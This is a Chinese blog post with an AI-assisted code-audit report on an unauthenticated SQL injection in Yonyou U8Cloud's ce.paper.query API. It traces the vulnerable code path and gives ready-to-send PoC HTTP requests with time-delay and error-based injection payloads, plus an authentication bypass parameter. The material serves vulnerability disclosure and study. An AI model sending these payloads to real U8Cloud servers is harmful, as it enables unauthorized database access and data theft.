---
title: "用友U8Cloud /u8cloud/openapi/ce.paper.query SQL 注入漏洞"
source: https://mrxn.net/jswz/u8cloud-openapi-ce-paper-query-sqli.html
asset_dir: assets/用友u8cloud-u8cloudopenapice.paper.query-sql-注入漏洞
---

# 用友U8Cloud /u8cloud/openapi/ce.paper.query SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/3 08:40
- 545浏览
- [0评论](#comment)
- 47分钟阅读

深入探索

自动完成

身份验证

验证

---

# 前言

本次漏洞分析全程由opencode+gemini-3-pro-high 完成。

开发工具

[![用友U8Cloud /u8cloud/openapi/ce.paper.query SQL 注入漏洞](images/img-001-d9f2595af53e.webp)](https://image.mrxn.net/f960771a7fa8434d95a4165e827e2eb1.webp)

我搭建好环境以及mcp后，提出需求，其余均为agent自动完成。

[![用友U8Cloud /u8cloud/openapi/ce.paper.query SQL 注入漏洞](images/img-002-1d839ece1607.webp)](https://image.mrxn.net/d6d492e25d8348e5b07460184370ec2e.webp)

效果还行。

SQL注入防护

深入探索

网络安全培训

漏洞修复方案

Web安全书籍

# 审计报告

## 1. 漏洞概述

在[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友") U8 Cloud 系统的 `/u8cloud/openapi/ce.paper.query` 接口中发现一处严重的高危 [SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。该漏洞允许未经身份验证的远程攻击者通过构造恶意的 JSON 请求，在数据库中执行任意 SQL 命令。漏洞的根源在于服务端未对用户输入的 `pk_group` 和 `pk_paper` 参数进行任何过滤或预编译处理，直接将其拼接至 SQL 查询语句中。

- **漏洞类型**: SQL 注入 (Blind/Stacked Queries)
- **影响组件**: 用友 U8 Cloud (ce.paper.query 接口)
- **危险等级**: 高危 (Critical)
- **利用条件**:
  - 网络可达 `/u8cloud/openapi/` 接口
  - 无需有效身份认证 (可通过 `appcode=lbsj` 绕过或直接调用)

## 2. 漏洞详细分析路径

### 2.1 入口点与 URL 路由处理

攻击者发起的 HTTP 请求首先由 Servlet 容器接收，并根据 URL 路径进行分发。

代码安全审计

1. **Servlet** **映射 (`ExtSystemInvokerServlet`)**:

   1. 在 `web.xml` 或 Servlet 注册中，路径 `/u8cloud/openapi/*` 被映射到 `nc.bs.framework.server.extsys.ExtSystemInvokerServlet`。
   2. 该 Servlet 的 `doAction` 方法会拦截请求。它通过遍历 `ExtSystemServerEnum` 枚举来匹配 URL 前缀。
   3. 匹配到 `OPENAPI` 枚举项 (`/u8cloud/openapi/`) 后，确定服务名称为 `u8cloud_openapi`。
2. **服务分发 (`APIOpenServletForJSON`)**:

   1. `ExtSystemInvokerServlet` 使用 `NCLocator` 查找名为 `u8cloud_openapi` 的服务组件。
   2. 该服务映射到 `u8c.server.APIOpenServletForJSON` 类。
   3. `APIOpenServletForJSON.doAction` 将请求转发给 `u8c.server.APIOpenController` 处理。
3. **路径解析与 Action 映射 (`APIOpenController`)**:

   1. `APIOpenController.forWard()` 方法被调用。
   2. **路径转换**: 方法内部调用 `getPath(request)`，将 URL 路径 `/ce/paper/query` 转换为点分字符串 `ce.paper.query`。
   3. **JSON** **解析**: 控制器读取 HTTP 请求体。由于我们在 URL 中指定了 `isEncrypt=N`，控制器跳过解密步骤，直接调用 `JSONObject.fromObject()` 解析 JSON 数据。
   4. **动态调用**: 控制器查找实现了 `IInvokeWithJSon` 接口的服务，并调用其 `invoke` 方法，传入解析后的路径 `ce.paper.query` 和 JSON 数据。
   5. 框架根据 `ce.paper.query` 标识符（对应 Action 的 `billMark` 或配置）将请求路由到 `u8c.bs.ce.action.PaperQueryAction`。

### 2.2 参数提取与对象转换

1. **Action 处理 (`PaperQueryAction`)**:

   1. `PaperQueryAction` 继承自 `AbstractBatchSaveAPIPubVOAction<PaperExecuteVO>`。
   2. 该基类负责将输入的 JSON 对象转换为 Java Value Object (VO) 数组。
   3. **关键点**: JSON 数据必须包含一个以 `billMark` (此处为 `"paperexecute"`) 命名的键，其值为一个数组。例如：`{"paperexecute": [{"pk_group": "...", "pk_paper": "..."}]}`。
   4. 框架使用反射将 JSON 数组中的字段（如 `pk_group`, `pk_paper`）映射到 `PaperExecuteVO` 对象的对应属性。此时，恶意的 SQL 注入 payload (如 `1'; WAITFOR DELAY '0:0:5'--`) 被注入到 VO 对象的 `pk_group` 属性中。
2. **业务逻辑调用**:

   1. `PaperQueryAction.save()` 方法被调用，传入包含恶意数据的 `PaperExecuteVO[]` 数组。
   2. 随后调用业务处理类 `PaperBP().queryResult(vos)`。

### 2.3 污点传播与 SQL 构建 (Sink)

1. **业务处理 (`PaperBP`)**:

   1. `PaperBP.queryResult` 方法从数组中取出第一个 VO 对象：`executeVOs[0]`。
   2. 它提取出 `pk_paper` 和 `pk_group` 属性值。
   3. 调用数据访问对象：`new PaperResultDMO().query(pk_paper, pk_group)`。
2. **漏洞触发点 (`PaperResultDMO`)**:

   1. 在 `u8c.bs.ce.dmo.PaperResultDMO.java` 的 `query` 方法中，存在直接的字符串拼接：

      漏洞扫描服务
   2. `public PaperResultVO query(String pk_paper, String pk_questiongroup) throws BusinessException { // 严重漏洞：直接将参数拼接到 SQL WHERE 子句中 PaperResultVO[] vos = (PaperResultVO[])new SuperVOQuery(PaperResultVO.class) .queryVOByWhere(" pk_paper = '" + pk_paper + "' and pk_group = '" + pk_questiongroup + "' "); // ... 后续还有第二次拼接 ... TaskVO[] tasks = (TaskVO[])new SuperVOQuery(TaskVO.class) .queryVOByWhere("pk_paper = '" + pk_paper + "' and pk_group = '" + pk_questiongroup + "'"); }`
   3. 当 `pk_questiongroup` 包含 `1'; WAITFOR DELAY '0:0:5'--` 时，最终执行的 SQL 变为：

      - `SELECT ... FROM ... WHERE pk_paper = '1' and pk_group = '1'; WAITFOR DELAY '0:0:5'--'`
3. 数据库（如 SQL Server）支持堆叠查询（Stacked Queries），因此会先执行前面的 SELECT 语句，紧接着执行 `WAITFOR DELAY` 命令，导致数据库暂停响应 5 秒。

## 3. 漏洞复现 (PoC)

通过 Fuzz 测试验证，以下 HTTP 请求可稳定触发漏洞。

机器学习与人工智能

路径：`/u8cloud/openapi/ce/paper/query` 或者 `/u8cloud/openapi/ce.paper.query` 均可

**Request:**

```
POST /u8cloud/openapi/ce.paper.query?appcode=lbsj&isEncrypt=N&trantype=paperexecute HTTP/1.1
Host: u8cloud.mrxn.net
Content-Type: application/json
Content-Length: 108

{
    "paperexecute": [
        {
            "pk_group": "1'; WAITFOR DELAY '0:0:5'--",
            "pk_paper": "1"
        }
    ]
}
```

```
POST /u8cloud/openapi/ce/paper/query?appcode=lbsj&isEncrypt=N HTTP/1.1
Host: u8cloud.mrxn.net
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 95

{
  "paperexecute": [
    { "pk_group": "1'; WAITFOR DELAY '0:0:5'--", "pk_paper": "1" }
  ]
}
```

[![用友U8Cloud /u8cloud/openapi/ce.paper.query SQL 注入漏洞](images/img-003-07ba0ce18946.webp)](https://image.mrxn.net/b5eb5ac37cbe4f638f0a8fe680140d8b.webp)

延时 5 秒

网络应用与在线工具

报错注入一样

```
POST /u8cloud/openapi/ce/paper/query?appcode=lbsj&isEncrypt=N HTTP/1.1
Host: u8cloud.mrxn.net
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 95

{
  "paperexecute": [
    { "pk_group": "'-1/user--", "pk_paper": "1" }
  ]
}
```

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=451D9D503710ADFFEC88E29923BE4AE6.server; Path=/; HttpOnly
Content-Type: application/json;charset=utf-8

{
  "status": "falied",
  "errorcode": "-32000",
  "errormsg": "U8C返回信息:在将 nvarchar 值 \u0027dbo\u0027 转换成数据类型 int 时失败。"
}
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#大模型](https://mrxn.net/tag/%E5%A4%A7%E6%A8%A1%E5%9E%8B)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.前言](#toc-1-)
- [2.审计报告](#toc-2-)
- [2.1.1. 漏洞概述](#toc-2-1-)
- [2.2.2. 漏洞详细分析路径](#toc-2-2-)
- [2.2.1.2.1 入口点与 URL 路由处理](#toc-2-2-1-)
- [2.2.2.2.2 参数提取与对象转换](#toc-2-2-2-)
- [2.2.3.2.3 污点传播与 SQL 构建 (Sink)](#toc-2-2-3-)
- [2.3.3. 漏洞复现 (PoC)](#toc-2-3-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
